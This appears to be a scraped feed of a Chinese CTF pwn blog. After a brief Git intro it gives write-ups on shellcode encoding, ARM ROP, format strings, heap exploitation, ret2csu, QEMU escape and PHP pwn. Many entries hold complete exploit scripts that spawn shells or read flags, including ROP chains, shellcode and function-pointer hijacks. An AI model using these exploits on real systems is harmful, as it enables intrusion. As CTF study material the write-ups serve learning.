是一种分布式版本控制系统，它可以不受网络连接的限制，加上其它众多优点，目前已经成为程序开发人员做项目版本管理时的首选，非开发人员也可以用 Git 来做自己的文档版本管理工具。
大概是大二的时候开始接触和使用Git，从一开始的零接触到现在的重度依赖，真是感叹 Git 的强大。
Git 的api很多，但其实平时项目中90%的需求都只需要用到几个基本的功能即可，所以本文将从 实用主义 和 深入探索 2个方面去谈谈如何在项目中使用 Git，一般来说，看完 实用主义 这一节就可以开始在项目中动手用。
说明：本文的操作都是基于 Mac 系统
实用主义 准备阶段 进入 Git官网 下载合适你的安装包，安装好 Git 后，打开命令行工具，进入工作文件夹（为了便于理解我们在系统 …</content></entry><entry><title>AE64</title><url>/post/shellcode/ae64/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>shellcode</tag></tags><content type="html"><![CDATA[  AE64 AE64 is a tool which can transform any amd64 architecture shellcode into pure alphanumeric shellcode using self-modify code technology, so the page need to be writable.
Install git clone https://github.com/veritas501/ae64.git --depth 1 cd ae64 sudo python3 setup.py install Usage For usage example, you can see example folder.
Quickstart from ae64 import AE64 from pwn import * context.arch=&#39;amd64&#39; # get bytes format shellcode shellcode = asm(shellcraft.sh()) # get alphanumeric shellcode enc_shellcode = AE64().encode(shellcode) print(enc_shellcode.decode(&#39;latin-1&#39;)) About default enc_shellcode = AE64().encode(shellcode) # equal to enc_shellcode = AE64().encode(shellcode, &#39;rax&#39;, 0, &#39;fast&#39;) &#39;&#39;&#39; def encode(self, shellcode: bytes, register: str = &#39;rax&#39;, offset: int = 0, strategy: str = &#39;fast&#39;) -&gt; bytes: &#34;&#34;&#34; encode given shellcode into alphanumeric shellcode (amd64 only) @param shellcode: bytes format shellcode @param register: the register contains shellcode pointer (can with offset) (default=rax) @param offset: the offset (default=0) @param strategy: encode strategy, can be &#34;fast&#34; or &#34;small&#34; (default=fast) @return: encoded shellcode &#34;&#34;&#34; &#39;&#39;&#39; About encode strategy I write two encode strategy, fast and small.
Fast strategy is the default strategy, it generate alphanumeric shellcode very fast, but the shellcode is a bit long.
Small strategy generate shellcode with the help of z3-solver, so it will be slower but when encoding big shellcode, it can gernerate much smaller shellcode.
Benchmark Functionality:
ae64 alpha3 Encode x32 alphanumeric shellcode ❌ ✔ Encode x64 alphanumeric shellcode ✔ ✔ Original shellcode can contain zero bytes ✔ ❌ Base address register can contain offset ✔ ❌ Length:
Origin length(in bytes) ae64(fast) ae64(small) alpha3 2 76 119 65 48 237 185 157 192 749 401 445 576 2074 977 1213 P.S.
length 2 shellcode: &ldquo;lbl : jmp lbl&rdquo;
length 48 shellcode: shellcraft.sh()
length 192 shellcode: shellcraft.sh()*4
length 576 shellcode: shellcraft.sh()*12
Old story For older version which I written for HCTF2018 christmas pwn challenge, goto branch old_archive.
https://github.com/veritas501/ae64/tree/old_archive ver1 details: https://github.com/veritas501/hctf2018#pwn---christmas4-solves   ]]></content></entry><entry><title>arm pwn基础知识</title><url>/post/arm-pwn/arm-pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url><categories><category>PWN</category><category>Arm Pwn</category></categories><tags><tag>arm pwn</tag></tags><content type="html"><![CDATA[   all in one arm ret2csu 参考博客 arm汇编学习 arm汇编学习 调试 #类似用gdbserver启动运行这个二进制文件 binary_path = &#34;/home/zp9080/PWN/pwn&#34; qemu_bin = &#39;qemu-aarch64&#39; # Ensure this is installed p = process([qemu_bin,&#39;-L&#39;,&#39;/usr/aarch64-linux-gnu/&#39;,&#39;-g&#39;, &#39;1234&#39;, binary_path]) # p = process([qemu_bin, &#39;-L&#39;,&#39;/usr/aarch64-linux-gnu/&#39;, binary_path]) #另一端连接上去 p = process([&#39;gdb-multiarch&#39;, &#39;./pwn&#39;, &#39;-q&#39;]) script=&#39;&#39;&#39; set architecture aarch64 target remote localhost:1234 b *$rebase(0xD0C) &#39;&#39;&#39; def dbg(): gdb.attach(p,script) pause() dbg()   ]]></content></entry><entry><title>arm pwn例题</title><url>/post/arm-pwn/arm-pwn%E4%BE%8B%E9%A2%98/</url><categories><category>PWN</category><category>Arm Pwn</category></categories><tags><tag>arm pwn</tag></tags><content type="html"><![CDATA[   以xyctf2024 EZ2.0?为例题，主要记录一下做题过程 发现pwntools的gdb.debug功能非常强大，可以很方便的调试 第一步看静态链接，网上一搜都说arm文件里应该有system函数，但是发现了/bin/sh字符串怎么都找不到system，也没有去符号表 于是想到来打orw，搜索到如下gadget zp9080@LAPTOP-N2IL3LVK:~/PWN$ ROPgadget --binary arm --only &#34;pop|ret&#34; Gadgets information ============================================================ 0x0001056c : pop {fp, pc} 0x0005f73c : pop {r0, pc} 0x00026634 : pop {r0, r4, pc} 0x0005f824 : pop {r1, pc} 0x00010160 : pop {r3, pc} 0x00014264 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc} 0x000104e0 : pop {r4, pc} 0x0001d698 : pop {r4, r5, pc} 0x00011240 : pop {r4, r5, r6, pc} 0x00010970 : pop {r4, r5, r6, r7, pc} 0x000198bc : pop {r4, r5, r6, r7, r8, fp, pc} 0x000110dc : pop {r4, r5, r6, r7, r8, pc} 0x00026f2c : pop {r4, r5, r6, r7, r8, sb, fp, pc} 0x000196a8 : pop {r4, r5, r6, r7, r8, sb, pc} 0x00010c1c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc} 0x00010d9c : pop {r4, r5, r6, r7, r8, sb, sl, pc} 0x0005d1ac : pop {r4, r5, r6, r7, r8, sl, pc} 0x0001c590 : pop {r4, r5, r7, pc} 0x0001b884 : pop {r4, r6, r7, pc} 0x000280a4 : pop {r4, r7, pc} 0x00027d78 : pop {r7, pc} 感觉好像没啥问题可以打，但是实际操作发现open的时候让r2寄存器变成0，这样即使open了文件read和write读入只能0字节 3. 准备打syscall，但是还是老问题，如何控制第三个参数 4. 最后搜索到可以类似csu这样来控制r2，于是得出解法
exp from pwn import * from pwnlib.util.packing import p32 context(arch=&#39;arm&#39;,endian=&#39;little&#39;,log_level=&#39;debug&#39;) # p = process([&#34;qemu-mipsel&#34;,&#34;-L&#34;,&#34;/usr/mipsel-linux-gnu/&#34;,&#34;./mips&#34;]) # p=gdb.debug(&#34;./arm&#34;,&#39;b *0x105C0&#39;) p=remote(&#39;10.131.223.200&#39;,60929) &#39;&#39;&#39; 0x00026634 : pop {r0, r4, pc} 0x0005f824 : pop {r1, pc} 00027DF4 SVC 0 0x00010c1c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc} &#39;&#39;&#39; &#39;&#39;&#39; .text:00010D7C MOV R2, R8 .text:00010D80 MOV R1, R7 .text:00010D84 MOV R0, R6 .text:00010D88 LDR R3, [R5,#4]! .text:00010D8C ADD R4, R4, #1 .text:00010D90 BLX R3 .text:00010D94 CMP R9, R4 .text:00010D98 BNE loc_10D7C .text:00010D9C POP {R4-R10,PC} &#39;&#39;&#39; read=0x27EC8 popchain=0x10c1c csu=0x10D7C syscall=0x27DF4 pop_r0_r4=0x26634 pop_r1=0x5f824 bss=0x8AE80 #read(0,bss,0x100) payload=b&#39;a&#39;*0x44+p32(pop_r0_r4)+p32(0)*2+p32(pop_r1)+p32(bss)+p32(read)+p32(0)*4+p32(popchain) payload+=p32(0)+p32(bss+4)+p32(bss)+p32(11)+p32(0)+p32(0)*3+p32(csu)+p32(0)+p32(syscall) payload=payload.ljust(0x100,b&#39;a&#39;) p.sendafter(&#34;welcome XYCTF arm world&#34;,payload) payload=b&#39;/bin/sh\x00&#39;+p32(pop_r1) payload=payload.ljust(0x100,b&#39;a&#39;) p.send(payload) p.interactive() exp中的细节 read函数的细节 注意arm架构会把LR压入栈，如果调用0x27EC4处的函数，无法进行rop，只能控制一次，因此调用从0x27EC8开始，注意vuln函数中的read很长，这样可以控制很大一部分栈的空间，只需注意 ADD SP, SP, #0xC ;POP {R4-R7,PC} 合理溢出来控制流程 .text:00027EC4 PUSH {R4-R7,LR} ; Alternative name is &#39;__libc_read&#39; .text:00027EC8 MOV R3, R0 .text:00027ECC BL __aeabi_read_tp .text:00027ED0 MOV R5, R0 .text:00027ED4 LDR R0, [R0,#-0x4C0] .text:00027ED8 SUB SP, SP, #0xC .text:00027EDC CMP R0, #0 .text:00027EE0 BNE loc_27F08 .text:00027EE4 MOV R0, R3 .text:00027EE8 MOV R7, #3 .text:00027EEC SVC 0 .text:00027EF0 CMN R0, #0x1000 .text:00027EF4 MOV R4, R0 .text:00027EF8 BHI loc_27F64 .text:00027EFC .text:00027EFC loc_27EFC ; CODE XREF: read+B4↓j .text:00027EFC MOV R0, R4 .text:00027F00 ADD SP, SP, #0xC .text:00027F04 POP {R4-R7,PC} csu函数的细节 要注意 LDR R3, [R5,#4]! BLX R3 这个语句，因为无法泄露栈地址，所以这里进行的操作是先read一次到bss，这样[R5,#4]的值就可控了，继续控制流程 注意pop指令是在栈上进行而不是bss段，但是溢出长度很长所以依旧可以控制栈，进而控制流程 注意arm的rop和linux的rop的区别，找到合适的gadget，分析如何控制流程就行了，syscall确实好用   ]]></content></entry><entry><title>basic</title><url>/post/format-string/basic/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>format-string</tag></tags><content type="html"> [TOC]
写入的字节数 但是写入4字节，也就是32位一般会太大不让写，所以一般都写入2字节 %n的理解 要利用%k$n这个特性，%n的特性：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量 在64位程序中，高2个字节一般都是0，printf函数遇到\x00结束，因此在64位程序中一般都是把overwrite地址放在后面，注意放在后面相对格式化字符串为第几个参数 一些正确的理解 调用printf函数也是在调用函数，注意函数调用是要用到栈的，因此一些数据会被写到栈上，通过printf函数泄露有用的数据
覆盖为小数字/大数字 wiki的文章</content></entry><entry><title>basic skills</title><url>/post/%E5%A0%86/basic-skills/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"> [TOC]
各个bin的大小 以下皆为chunk的大小： fastbin:0x20-0x80 smallbin:&amp;lt;=0x3f0 largebin:&amp;gt;=0x400 tcache:0x20-0x410
unlink unlink 的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）比如当前Q是使用中的一个chunk，P是Q的prev chunk或者next chunk，如果free(Q),那么在堆空间上P,Q相邻且都被free，要合并这两个chunk,首先要先把P从bin中取出来，因此进行了unlink,unlink是对P进行的操作。 unlink要绕过的检查,检查有个缺陷，就是 fd/bk 指针都是通过与 chunk 头部的相对地址来查找的 off-by-one/off-by-null 当chunk大小&amp;lt;0x80的时候会直接进入tcache，不会参与unlink unlink之后的overlapping chunk都会进入unsorted bin，不论其大小 uaf 条件：在free掉一块内存后，没有将其置为NULL，紧接着申请大小相同的内存，操作系统会将刚刚free掉的内存再次分配。(为了更高的分配效率) glibc 堆分配的策略为first-fit。在分配内存时，malloc 会先到 unsorted bin（或者fastbins） 中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去找合适的 chunk。 chunk extend and overlapping chunk extend 就是通过控制 size 和 prev_size 域来实现跨越块操作从而导致 overlapping 的 漏洞利用条件：漏洞可以控制 chunk header 中的数据（所以经常会结合off-by-one一起用） 漏洞作用：一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。 利用方法：后向overlapping:一般都是通过修改该chunk的size字段，再将其free，free的时候就对next chunk进行了overlapping。如果再malloc合适大小，就可以得到extend后的chunk，通过edit函数进行控制。而且如果extend后是small bin的大小，会放入unsorted bin中，这时候chunk会有一些有用信息</content></entry><entry><title>basic_shellcode</title><url>/post/shellcode/basic_shellcode/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>shellcode</tag></tags><content type="html"><![CDATA[  [TOC]
注意架构 通常情况下，pwntools 会根据您的操作系统和系统架构来自动选择合适的默认架构。如果您在64位操作系统上运行 pwntools，它通常会默认使用 x86_64 架构 #无任何限制的shellcode 直接用asm(shellcraft.sh())生成shellcode 注意rdi存的值不是字符串/bin/sh，而是存放/bin/sh的地址
最短shellcode 执行execve函数 cdq指令把 EAX 的第 31 bit 复制到 EDX 的每一个 bit 上，主要用途是将rdx置为0
xor rsi, rsi push	rsi	mov rdi, 0x68732f2f6e69622f push	rdi push	rsp	pop	rdi	mov al,59	cdq	syscall 注意这几步操作，先把/bin//sh字符存入rdi,然后push rdi，那么/bin//sh就进入栈中，rsp现在正指向sh的地址，再push rsp，就是把sh的地址放入栈中，pop rdi就是把sh的地址放入rdi中 不能简单的只mov rdi, 0x68732f2f6e69622f
orw的shellcode 长度为0x28字节，主要是通过异或实现了取代了mov减少长度要求
mov rdx, 0x200 push 0x67616c66 这就是flag的字符串 mov rdi,rsp xor esi,esi #如果本来rsi=0，可以删掉这句 mov eax,2 syscall eax=2 open(‘flag’,0) mov edi,3 mov rsi,rsp xor eax,eax syscall eax=0 read(3,buf,0x200) xor edi,2 mov eax,edi syscall eax=1 write(1,buf,0x200) 做题的时候发现edx不能太大，不然程序会崩掉，同时限制了字符可以这样orw
shellcode=&#39;&#39;&#39; mov byte ptr [rsp+0x0],0x66 mov byte ptr [rsp+0x1],0x6c mov byte ptr [rsp+0x2],0x60 mov byte ptr [rsp+0x3],0x67 mov byte ptr [rsp+0x4],0 mov byte ptr [rsp+0x5],0 mov byte ptr [rsp+0x6],0 mov byte ptr [rsp+0x7],0 xor byte ptr [rsp+0x2],1 mov edx,0x200 push rsp pop rdi xor esi,esi mov eax,2 syscall mov edi,eax push rsp pop rsi xor eax,eax syscall xor edi,2 mov eax,edi syscall &#39;&#39;&#39;   ]]></content></entry><entry><title>C++</title><url>/post/c++-pwn/c++/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"><![CDATA[  std::allocator std::allocator::allocator 是 C++ 标准库中的一个类构造函数。它属于 std::allocator 类的一部分，用于分配和管理内存，特别是用于分配字符 (char) 类型的内存。 在使用 std::allocator 时，通常不需要显式调用 std::allocator::allocator 构造函数，而是可以直接创建 std::allocator 对象，并使用其成员函数 allocate 和 deallocate 来分配和释放内存。 一个例子 #include &lt;iostream&gt; #include &lt;memory&gt; int main() { std::allocator&lt;char&gt; charAllocator; // 创建 // 使用分配器分配内存 char* charArray = charAllocator.allocate(10); // 使用分配的内存 for (int i = 0; i &lt; 10; i++) { charArray[i] = &#39;A&#39; + i; } // 使用完后释放内存 charAllocator.deallocate(charArray, 10); return 0; }   ]]></content></entry><entry><title>C++libc配置</title><url>/post/c++-pwn/c++libc%E9%85%8D%E7%BD%AE/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"><![CDATA[   参考的是这篇文章 方法一 直接在相应的ubuntu版本下写题 方法二 在相应的ubuntu中创建C++文件,并且g++ -g test.cpp -o test,然后直接去指向的文件找copy其中的libc文件 cp /lib/x86_64-linux-gnu/libstdc++.so.6 ~/libstdc++.so.6 docker cp 9356a578cce7:/root/libstdc++.so.6 C:\Users\ZP\Desktop Successfully copied 2.52MB to C:\Users\ZP\Desktop //C++ #include&lt;iostream&gt; using namespace std; int main(){ cout&lt;&lt;&#34;Hello world&#34;&lt;&lt;endl; return 0; } 方法三 docker run -it ubuntu:20.04 /bin/bash apt update apt install build-essential 安装vim然后像方法二一样做即可   ]]></content></entry><entry><title>C++异常处理</title><url>/post/c++-pwn/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url><categories><category>PWN</category><category>C++ Pwn</category></categories><tags><tag>c++ pwn</tag></tags><content type="html"> [TOC] 参考博客 源码分析 原理 介绍 异常是一种处理错误的方式，当一个函数发现自己无法处理的错误时就可以抛出异常，让函数的直接或间接的调用者处理这个错误 throw: 当问题出现时，程序会抛出一个异常。这是通过使用 throw 关键字来完成的。 catch: 在您想要处理问题的地方，通过异常处理程序捕获异常.catch 关键字用于捕获异常，可以有多个catch进行捕获 try: try 块中的代码标识将被激活的特定异常,它后面通常跟着一个或多个 catch 块 在函数调用链中异常栈展开匹配原则 首先检查throw本身是否在try块内部，如果是再查找匹配的catch语句。如果有匹配的，则调到catch的地方进行处理 没有匹配的catch则退出当前函数栈，继续在调用函数的栈中进行查找匹配的catch 如果到达main函数的栈，依旧没有匹配的，则终止程序。上述这个沿着调用链查找匹配的catch子句的过程称为栈展开。所以实际中我们最后都要加一个catch(…)捕获任意类型的异常，否则当有异常没捕获，程序就会直接终止 找到匹配的catch子句并处理以后，会继续沿着catch子句后面继续执行 主要过程 1）调用 __cxa_allocate_exception 函数，分配一个异常对象。 2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。 3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。 4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。 5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。 6）_Unwind_RaiseException() 将控制权转到相应的catch代码。 从 c++ 的角度看，一个完整的异常处理流程就完成了，当然，其中省略了很多的细节，其中最让人觉得神秘的也许就是 personality routine 了，它是怎么知道当前 Unwind 的函数是否有相应的 catch 语句呢？又是怎么知道该怎样去清理这个函数内的局部变量呢？具体实现这儿先不细说，只需要大概明白，其实它也 …</content></entry><entry><title>CISCN-2021 satool</title><url>/post/llvm-pwn/ciscn-2021-satool/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"><![CDATA[   刚做完红帽杯那个入门题来写这个，一看代码500多行的re直接不想看了，后来跟着这个博客过了一遍，收获不少 参考博客 核心思想 做llvm pass首先要知道主函数是什么，在此题中是这个,注意这里是小端序，因此函数名应当是B4ckDo0r llvm pass函数代码中的函数一定会有会判断其参数的部分，比如这里，参数个数就为2 确定函数参数的类型，是char *还是int还是别的，通过函数中具体内容来确定，比如有个复制函数那么它很可能是char * 函数的返回类型一般就是void，除非有其他特别的，然后主函数一般都是int，因为最后有return 0; 逆向函数中的具体内容，a.一般先找熟悉的函数，比如有memcpy这种，或者free这种，b.另一种方法就是注意一些全局变量的赋值，有时候就可以将一些地方的值存到某处，特别是此处在libc附近，c.最后就是要注意任意写，任意函数执行的地方 最后最重要的就是要学会动调，猜出程序的逻辑，难逆向的逻辑就动调猜出来 题目解析 函数逆向后大致逻辑如下 exp // clang-8 -emit-llvm -S exp.c -o exp.ll void save(char *a, char *b); void stealkey(); void fakekey(long long x); void run(); void B4ckDo0r() { save(&#34;\n&#34;, &#34;\n&#34;); save(&#34;&#34;, &#34;\n&#34;); stealkey(); fakekey(-0x1ecbf0+0xe3afe); run(); }   ]]></content></entry><entry><title>crt pwn</title><url>/post/pwn%E7%AC%94%E8%AE%B0/crt-pwn/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[   打NKCTF2024遇到的一个题，还比较有意思，pwn中结合了密码相关的知识 后面的内容很简单，就是写入p64()*4，因此刚好可以getshell，因此泄露libcbase很重要 这里很有意思是用stdout % n，有6次机会，因此想到要用crt，具体做法如下 from pwn import * context.log_level = &#34;debug&#34; context.arch = &#34;amd64&#34; context.os = &#34;linux&#34; # 请教队内的密码学手子获取到sympy库里有直接的CRT方法 from sympy.ntheory.modular import crt # p = process(&#39;./leak&#39;) p = remote(&#34;node.nkctf.yuzhian.com.cn&#34;, 39485) def debug(): gdb.attach(p) pause() # 101 | 103 | 107 | 109 | 113 | 127 # 6个互质的数 a1 = [122, 119, 121, 123, 125, 127] # a2 = b&#39;&#39; payload1 = [(p8(a1[i])) for i in range(6)] payload1 = b&#39;&#39;.join(payload1)[::-1] # p.recvuntil(&#34;secret\n&#34;) p.sendafter(&#34;secret\n&#34;, payload1) # 余数 c_list = p.recvline() stack_al = int(c_list[-2]) c_list = [int(c_list[i]) for i in range(6)][::-1] # # 解中国剩余定理 res = crt(a1, c_list)[0] # leak stdout # print(hex(res)) info(&#34;leak: &#34; + hex(res)) n = 1 for i in range(0, 6): n *= a1[i] info(&#34;n: &#34; + hex(n)) # 确保 stdout_addr 差不多接近 stdout_addr = 0 c = 0 while True: stdout_addr = res + c * n if (stdout_addr &gt;&gt; 44) == 0x07: if (stdout_addr &amp; 0xfff) == 0x780: break c += 1 assert c &lt; 100 info(&#34;stdout_addr: &#34; + hex(stdout_addr)) # info(&#34;guess libc: &#34; + str([hex(stdout_addr - i * n) for i in range(-11, 10)])) # pause() # guess remote is 2.35-0ubuntu3.6 libc = ELF(&#34;./libc.so.6&#34;) libc_base = stdout_addr - libc.symbols[&#34;_IO_2_1_stdout_&#34;] info(&#34;libc_base: &#34; + hex(libc_base)) libc.address = libc_base ret = 0x0000000000029139 + libc_base pop_rdi = 0x000000000002a3e5 + libc_base info(&#34;stack_al: &#34; + hex(stack_al)) payload = b&#39;&#39;.join( [ p64(pop_rdi), p64(libc.search(b&#34;/bin/sh&#34;).__next__()), p64(ret), p64(libc.symbols[&#34;system&#34;]), p8(stack_al + 0x58) ] ) p.send(payload) p.interactive()   ]]></content></entry><entry><title>csu_init</title><url>/post/stackoverflow/csu_init/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"><![CDATA[  [TOC]
代码部分 csu_front_addr csu_end_addr 注意不要add rsp,8 function应当是所要调用的函数在栈或bss段上的地址，这样call [r12+rbx*8]才能正确，因为要根据地址来访问值
def csu(rdi,rsi,rdx,function): csu_front_addr=0x400710 csu_end_addr=0x40072A payload = b&#39;&#39; payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(function) + p64(rdi) + p64(rsi) + p64(rdx) payload += p64(csu_front_addr) return payload 原理讲解 这个地方不会用到 这里是我们会用到的地方 这个地方有时候会不同，用模板的时候留意一下如果不同注意修改 注意这个细节 __frame_dummy_init_array_entry - 600E10h这个值一般都为0
解题方法 csu_init有两种解法：
第一种 在call这个地方就直接拿到shell了，那就不需要考虑rsp的剩下变化了，也较为简单 call ds:(__frame_dummy_init_array_entry - 600DC8h)[r12+rbx*8]
第二种 还需要继续执行csu_front_addr后面的部分，那么要注意这个地方rsp的变化,特别是进行伪栈帧的时候，因为我们控制流程很依赖ret指令，所以搞清楚rsp现在为多少十分重要 add rsp, 8 pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn
例题 DASCTF X 0psu3十一月挑战赛 ASadStory 题目给了pie但是close(1)，也就要没有libc来orw。选择改close末位字节为syscall，利用read函数控制rax寄存器的值，配合ret2csu完成利用 许多libc函数偏移一下就有syscall read函数的返回值是读入的字节数，存到rax，可以设置系统调用号的rax 关闭了标准输出可以用标准错误来写出flag 注意这题csu的不同 from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) r=process(&#34;/home/zp9080/PWN/pwn&#34;) elf=ELF(&#34;/home/zp9080/PWN/pwn&#34;) libc=ELF(&#39;/home/zp9080/PWN/libc-2.31.so&#39;) p = process(&#34;/home/zp9080/PWN/pwn&#34;) def elf_base(): p.sendlineafter(b&#39;: &#39;, b&#39;1&#39;) p.sendlineafter(b&#39;: &#39;, b&#39;1&#39;) p.recvuntil(b&#39;0x&#39;) value = int(p.recv(12), 16) - 0x1249 return value elf.address = elf_base() print(&#34;elf--&gt;&#34; + hex(elf.address)) csu1 = elf.address + 0x1620 csu2 = elf.address + 0x163a offset = b&#39;a&#39; * 0x38 # Craft the ROP chain rop_chain = [ csu2, 0, 1, 0, elf.got[&#39;close&#39;], 1, elf.got[&#39;read&#39;], csu1, 0, 0, 0, 0, 0, 0, 0, csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got[&#39;read&#39;], csu1, 0, 0, 0, 0, 0, 0, 0, csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got[&#39;close&#39;], csu1, 0, 0, 0, 0, 0, 0, 0, csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#39;read&#39;], csu1, 0, 0, 0, 0, 0, 0, 0, csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#39;read&#39;], csu1, 0, 0, 0, 0, 0, 0, 0, csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#39;close&#39;], csu1 ] payload = flat(rop_chain) p.sendline(b&#39;2&#39;) p.sendline(offset + payload) p.send(b&#39;\x15&#39;) p.send(b&#39;/flag&#39; + b&#39;\x00&#39; * (257 - 5)) p.send(b&#39;\x00&#39; * 1) p.interactive()   ]]></content></entry><entry><title>ctypes</title><url>/post/pwn%E7%AC%94%E8%AE%B0/ctypes/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>ctypes</tag></tags><content type="html"><![CDATA[  用python中的库实现C
from pwn import * from ctypes import * from pwnlib.util.packing import p64 p = remote(&#39;10.131.194.201&#39;,59746) LIBC = CDLL(&#39;libc.so.6&#39;) seed = LIBC.time(0) LIBC.srand(seed) x = LIBC.rand() payload = str(x).encode() p.sendline(payload) p.interactive()   ]]></content></entry><entry><title>D3BabyEscape</title><url>/post/qemu-pwn/d3babyescape/</url><categories><category>PWN</category><category>Qemu Pwn</category></categories><tags><tag>qemu pwn</tag></tags><content type="html"><![CDATA[  [TOC]
学完qemu逃逸后的第一题，这个题难点在于要逆向 题目分析 如何开始逆向 首先根据-device启动参数知道设备是l0dev，接下来进行逆向。逆向当然不是看所有部分，我们只关心一些重点，也就是这些部分。通过search text找到所有含有l0dev的字符串然后逆向这些函数 这里有个小技巧，其实大部分mmio_read或者mmio_write这些函数的参数列表其实都是相似的，这里之前参考之前的一个题进行修改，事实证明确实如此 逆向有开源的东西时不要硬逆，看看有没有什么资源是现成的那就可以直接用 l0dev_realize函数 可见mmio,pmio都有 l0dev_instance_init函数 其实qemu都会维护一个结构体，这里的v1一般就是这个结构体的头部，因此可以根据此大致逆向出这个结构体是个什么，而且这个结构体一般都有buffer 结构体 逆向结构体的过程就是算算偏移，要自己体会 mmio_read函数 如果可以控制offset，就可以任意地址泄露 mmio_write函数 发现addr=128可以控制offset的值 addr=64这个看的很奇怪，其实就是根据结构体头部+0xd48来执行这里的函数，然后将buf作为rdi,就是一个任意函数执行 pmio_read函数 复制值666就可以让magic=1 pmio_write函数 magic=1可以任意地址写 exp分析 有了任意地址读和写，任意函数执行，这个题就很简单了 exp没什么好分析的，注意如何使用libc中的函数，从Dockerfile里面看到libc版本然后手动找偏移就行了 通过info pci找到pmio的端口 #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/io.h&gt; char *mmio_mem; size_t mmio_read(size_t addr) { size_t *mmio = (size_t *)((size_t)mmio_mem + addr); return *(mmio); } void mmio_write(size_t addr, size_t val) { size_t *mmio = (size_t *)((size_t)mmio_mem + addr); *(mmio) = val; } #define IO_PORT 0xc000 size_t pmio_read(size_t addr) { size_t pmio = IO_PORT + addr; return inl(pmio); } void pmio_write(size_t addr, size_t val) { size_t pmio = IO_PORT + addr; outl(val, pmio); } int main() { int mmio_fd; size_t libc_addr = 0, system_addr; // Open and map I/O memory for the string device mmio_fd = open(&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;, O_RDWR | O_SYNC); if (mmio_fd == -1) { perror(&#34;open&#34;); exit(EXIT_FAILURE); } mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) { perror(&#34;mmap&#34;); exit(EXIT_FAILURE); } if(iopl(3) == -1) /* Apply to system for accessing the port */ { perror(&#34;iopl&#34;); exit(EXIT_FAILURE); } mmio_write(128, 0x100); libc_addr = mmio_read(4); libc_addr = libc_addr - 0x460a0; // srandom offset printf(&#34;libc_addr: %#lx\n&#34;, libc_addr); system_addr = libc_addr + 0x50d70; //让magic的值为666 pmio_write(0, 666); pmio_read(0); //覆盖rand_r为system，任意函数执行 pmio_write(20, system_addr); mmio_write(64, 0x6873); return 0; } mkdir exp cp ./bin/rootfs.img ./exp/ cd exp cpio -idmv &lt; ./rootfs.img mkdir root cp ../exp.c ./root/ gcc ./root/exp.c -o ./root/exp -static find . | cpio -o --format=newc &gt; rootfs.img cp rootfs.img /home/zp9080/attachment/bin   ]]></content></entry><entry><title>D3CTF PwnShell</title><url>/post/php-pwn/d3ctf-pwnshell/</url><categories><category>PWN</category><category>Php Pwn</category></categories><tags><tag>php pwn</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客1 题目分析 题目中add是一个堆块ck2存另一个堆块的地址ck1，这就有了利用的机会，如果可以控制ck2的内容，那么就有任意地址写 edit是通过*ck2来找到ck1的，因此和add对应会有任意地址写 delete先free ck1再free ck2 exp 还是用/proc/self/maps来泄露libcbase和vuln.so的base off-by-null的利用，注意到$b都是0x3f字节，为了避免off-by-null，free(7)后再add出来$c是0x40字节，就会覆盖ck8&rsquo;中存的ck8的地址，也即是图中0x80变成0x00，也就是对应着ck5 那么edit(8)就相当于edit ck5了，先把ck5 free掉，然后edit(8)就类似tcache poison的打法 第一次add出ck5,第二次add就是efree_got了,add同时写入system 最后类似打hijackgot攻击成功 &lt;?php function str2Hex($str) { $hex = &#34;&#34;; for ($i = strlen($str) - 1;$i &gt;= 0;$i--) $hex.= dechex(ord($str[$i])); $hex = strtoupper($hex); return $hex; } function int2Str($i, $x = 8) { $re = &#34;&#34;; for ($j = 0; $j &lt; $x; $j++) { $re .= pack(&#39;C&#39;, $i &amp; 0xff); $i &gt;&gt;= 8; } return $re; } function hex64(int $value):string{ static $hex64_table=[ 